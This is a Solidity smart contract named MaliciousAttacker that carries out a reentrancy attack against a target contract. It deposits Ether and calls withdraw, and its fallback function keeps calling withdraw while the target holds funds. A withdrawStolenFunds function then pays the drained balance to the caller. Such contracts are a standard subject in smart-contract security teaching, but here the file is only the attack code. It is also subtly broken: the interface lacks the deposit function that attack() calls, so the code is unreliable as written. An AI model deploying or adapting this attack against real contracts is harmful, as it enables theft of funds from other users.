// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrancyExample {
    function withdraw(uint256 _amount) external;
}

contract MaliciousAttacker {
    IReentrancyExample public target;

    constructor(address _targetAddress) {
        target = IReentrancyExample(_targetAddress);
    }

    // Fallback function that is triggered when the contract receives Ether
    fallback() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether);  // Call withdraw recursively
        }
    }

    // Initiates the attack
    function attack() public payable {
        require(msg.value >= 1 ether, "Send at least 1 ether to attack");
        target.deposit{value: msg.value}();  // Deposit into the target contract
        target.withdraw(1 ether);  // Start the withdrawal process
    }

    // To retrieve the stolen funds
    function withdrawStolenFunds() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
